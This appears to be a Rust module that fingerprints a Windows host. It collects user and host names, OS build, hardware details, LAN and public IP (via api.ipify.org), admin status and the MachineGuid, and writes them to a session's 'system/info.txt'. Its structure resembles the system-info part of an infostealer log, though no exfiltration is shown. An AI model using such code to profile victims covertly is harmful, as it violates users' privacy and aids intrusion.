//! Host fingerprint and hardware inventory, written to `system/info.txt`.

use std::net::UdpSocket;
use std::time::Duration;

use winapi::shared::minwindef::DWORD;
use winapi::shared::ntdef::ULARGE_INTEGER;
use winapi::um::fileapi::GetDiskFreeSpaceExW;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::sysinfoapi::{GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO};
use winapi::um::timezoneapi::{
    GetTimeZoneInformation, TIME_ZONE_INFORMATION, TIME_ZONE_ID_INVALID,
};
use winapi::um::winbase::{GetComputerNameW, GetUserNameW};
use winapi::um::wingdi::{DISPLAY_DEVICEW, DISPLAY_DEVICE_ATTACHED_TO_DESKTOP};
use winapi::um::winnt::{OSVERSIONINFOW, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation, TIME_ZONE_ID_DAYLIGHT};
use winapi::um::winuser::{EnumDisplayDevicesW, GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_64KEY};
use winreg::RegKey;

use crate::session::Session;
use crate::util;

const VERSION_KEY: &str = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
const CPU_KEY: &str = r"HARDWARE\DESCRIPTION\System\CentralProcessor\0";
const CRYPTO_KEY: &str = r"SOFTWARE\Microsoft\Cryptography";

pub struct Meta {
    pub host: String,
    pub user: String,
    pub os: String,
    pub ip: String,
    pub admin: bool,
    pub hwid: String,
}

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn from_wide(buf: &[u16]) -> String {
    let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    String::from_utf16_lossy(&buf[..end])
}

fn reg_string(path: &str, name: &str) -> Option<String> {
    let key = RegKey::predef(HKEY_LOCAL_MACHINE)
        .open_subkey_with_flags(path, KEY_READ | KEY_WOW64_64KEY)
        .ok()?;
    key.get_value::<String, _>(name).ok()
}

fn reg_u32(path: &str, name: &str) -> Option<u32> {
    let key = RegKey::predef(HKEY_LOCAL_MACHINE)
        .open_subkey_with_flags(path, KEY_READ | KEY_WOW64_64KEY)
        .ok()?;
    key.get_value::<u32, _>(name).ok()
}

fn host() -> String {
    let mut buf = [0u16; 256];
    let mut len = buf.len() as DWORD;
    unsafe {
        if GetComputerNameW(buf.as_mut_ptr(), &mut len) != 0 {
            return String::from_utf16_lossy(&buf[..len as usize]);
        }
    }
    String::from("unknown")
}

fn user() -> String {
    let mut buf = [0u16; 256];
    let mut len = buf.len() as DWORD;
    unsafe {
        if GetUserNameW(buf.as_mut_ptr(), &mut len) != 0 && len > 0 {
            return String::from_utf16_lossy(&buf[..len as usize - 1]);
        }
    }
    String::from("unknown")
}

/// `GetVersionExW` lies without an app manifest, so ask ntdll directly.
fn version() -> Option<(u32, u32, u32)> {
    type RtlGetVersion = unsafe extern "system" fn(*mut OSVERSIONINFOW) -> i32;

    unsafe {
        let ntdll = GetModuleHandleW(wide("ntdll.dll").as_ptr());
        if ntdll.is_null() {
            return None;
        }
        let address = GetProcAddress(ntdll, b"RtlGetVersion\0".as_ptr() as *const i8);
        if address.is_null() {
            return None;
        }
        let func: RtlGetVersion = std::mem::transmute(address);

        let mut info: OSVERSIONINFOW = std::mem::zeroed();
        info.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOW>() as u32;
        if func(&mut info) != 0 {
            return None;
        }
        Some((
            info.dwMajorVersion,
            info.dwMinorVersion,
            info.dwBuildNumber,
        ))
    }
}

fn os() -> String {
    let (major, minor, build) = version().unwrap_or((0, 0, 0));
    let family = match build {
        22000.. => "Windows 11",
        10240.. => "Windows 10",
        9600.. => "Windows 8.1",
        9200.. => "Windows 8",
        7600.. => "Windows 7",
        _ => "Windows",
    };
    let display = reg_string(VERSION_KEY, "DisplayVersion").unwrap_or_default();
    let ubr = reg_u32(VERSION_KEY, "UBR").unwrap_or(0);
    let display = if display.is_empty() {
        String::new()
    } else {
        format!(" {display}")
    };
    format!("{family}{display} (build {major}.{minor}.{build}.{ubr})")
}

fn edition() -> String {
    reg_string(VERSION_KEY, "ProductName").unwrap_or_else(|| String::from("unknown"))
}

fn cpu() -> String {
    reg_string(CPU_KEY, "ProcessorNameString")
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .unwrap_or_else(|| String::from("unknown"))
}

fn cores() -> u32 {
    unsafe {
        let mut info: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut info);
        info.dwNumberOfProcessors
    }
}

fn ram() -> u64 {
    unsafe {
        let mut status: MEMORYSTATUSEX = std::mem::zeroed();
        status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as DWORD;
        if GlobalMemoryStatusEx(&mut status) == 0 {
            return 0;
        }
        status.ullTotalPhys
    }
}

fn gpus() -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    let mut index: DWORD = 0;
    loop {
        let mut device: DISPLAY_DEVICEW = unsafe { std::mem::zeroed() };
        device.cb = std::mem::size_of::<DISPLAY_DEVICEW>() as DWORD;
        let found = unsafe { EnumDisplayDevicesW(std::ptr::null(), index, &mut device, 0) };
        if found == 0 {
            break;
        }
        index += 1;
        if device.StateFlags & DISPLAY_DEVICE_ATTACHED_TO_DESKTOP == 0 {
            continue;
        }
        let name = from_wide(&device.DeviceString);
        if !name.is_empty() && !out.contains(&name) {
            out.push(name);
        }
    }
    out
}

fn screen() -> (i32, i32) {
    unsafe { (GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)) }
}

fn timezone() -> String {
    unsafe {
        let mut tz: TIME_ZONE_INFORMATION = std::mem::zeroed();
        let id = GetTimeZoneInformation(&mut tz);
        if id == TIME_ZONE_ID_INVALID {
            return String::from("unknown");
        }
        let daylight = id == TIME_ZONE_ID_DAYLIGHT;
        // Bias counts minutes added to local time to reach UTC.
        let bias = tz.Bias + if daylight { tz.DaylightBias } else { tz.StandardBias };
        let offset = -bias;
        let sign = if offset < 0 { '-' } else { '+' };
        let offset = offset.abs();
        let name = if daylight {
            from_wide(&tz.DaylightName)
        } else {
            from_wide(&tz.StandardName)
        };
        format!(
            "UTC{sign}{:02}:{:02} ({name})",
            offset / 60,
            offset % 60
        )
    }
}

fn system_drive() -> String {
    let drive = std::env::var("SystemDrive").unwrap_or_else(|_| String::from("C:"));
    format!("{}\\", drive.trim_end_matches('\\'))
}

fn disk() -> (u64, u64) {
    let path = wide(&system_drive());
    let mut available = 0u64;
    let mut total = 0u64;
    let mut free = 0u64;
    unsafe {
        let ok = GetDiskFreeSpaceExW(
            path.as_ptr(),
            &mut available as *mut u64 as *mut ULARGE_INTEGER,
            &mut total as *mut u64 as *mut ULARGE_INTEGER,
            &mut free as *mut u64 as *mut ULARGE_INTEGER,
        );
        if ok == 0 {
            return (0, 0);
        }
    }
    (free, total)
}

fn is_admin() -> bool {
    unsafe {
        let mut token = std::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let mut elevation: TOKEN_ELEVATION = std::mem::zeroed();
        let mut size = 0u32;
        let ok = GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        );
        CloseHandle(token);
        ok != 0 && elevation.TokenIsElevated != 0
    }
}

fn machine_guid() -> String {
    reg_string(CRYPTO_KEY, "MachineGuid").unwrap_or_else(|| String::from("unknown"))
}

/// No packet is sent: connecting a UDP socket just resolves the route source.
fn lan_ip() -> String {
    let Ok(socket) = UdpSocket::bind("0.0.0.0:0") else {
        return String::from("0.0.0.0");
    };
    if socket.connect("8.8.8.8:80").is_err() {
        return String::from("0.0.0.0");
    }
    match socket.local_addr() {
        Ok(addr) => addr.ip().to_string(),
        Err(_) => String::from("0.0.0.0"),
    }
}

fn public_ip() -> Option<String> {
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(4))
        .build()
        .ok()?;
    let response = client.get("https://api.ipify.org").send().ok()?;
    if !response.status().is_success() {
        return None;
    }
    let text = response.text().ok()?;
    let ip = text.trim();
    ip.parse::<std::net::IpAddr>().ok().map(|_| ip.to_string())
}

pub fn collect(session: &mut Session) -> Meta {
    let host = host();
    let user = user();
    let os = os();
    let lan = lan_ip();
    let public = public_ip();
    let ip = public.clone().unwrap_or_else(|| lan.clone());
    let admin = is_admin();
    let hwid = machine_guid();
    let (free, total) = disk();
    let (width, height) = screen();

    let mut report = String::new();
    report.push_str(&format!("# {} — {}\n\n", host, util::timestamp()));
    report.push_str(&format!("user      : {user}\n"));
    report.push_str(&format!("host      : {host}\n"));
    report.push_str(&format!("os        : {os}\n"));
    report.push_str(&format!("edition   : {}\n", edition()));
    report.push_str(&format!("cpu       : {} ({} cores)\n", cpu(), cores()));
    let gpu = gpus();
    report.push_str(&format!(
        "gpu       : {}\n",
        if gpu.is_empty() {
            String::from("unknown")
        } else {
            gpu.join(", ")
        }
    ));
    report.push_str(&format!("ram       : {}\n", util::human_size(ram())));
    report.push_str(&format!("screen    : {width}x{height}\n"));
    report.push_str(&format!("timezone  : {}\n", timezone()));
    report.push_str(&format!("lan ip    : {lan}\n"));
    report.push_str(&format!(
        "public ip : {}\n",
        public.clone().unwrap_or_else(|| String::from("unavailable"))
    ));
    report.push_str(&format!("disk      : {} free of {}\n", util::human_size(free), util::human_size(total)));
    report.push_str(&format!("admin     : {admin}\n"));
    report.push_str(&format!("hwid      : {hwid}\n"));
    report.push_str(&format!(
        "exe       : {}\n",
        std::env::current_exe()
            .map(|p| p.to_string_lossy().into_owned())
            .unwrap_or_else(|_| String::from("unknown"))
    ));

    session.put_text("system/info.txt", &report);
    session.note(&format!("system: {user}@{host}, {os}"));
    session.line(&format!("host: {user}@{host}"));
    session.line(&format!("os: {os}"));
    session.line(&format!(
        "network: {lan} / {}",
        public.unwrap_or_else(|| String::from("no public ip"))
    ));

    Meta {
        host,
        user,
        os,
        ip,
        admin,
        hwid,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn report_is_populated() {
        let mut session = Session::new();
        let meta = collect(&mut session);
        let report = std::fs::read_to_string(session.root.join("system/info.txt")).unwrap_or_default();
        session.destroy();

        assert!(meta.host != "unknown" && !meta.host.is_empty());
        assert!(meta.user != "unknown" && !meta.user.is_empty());
        assert!(report.contains("hwid"));
        assert!(report.contains("cpu"));
        assert!(report.contains("timezone"));
    }
}
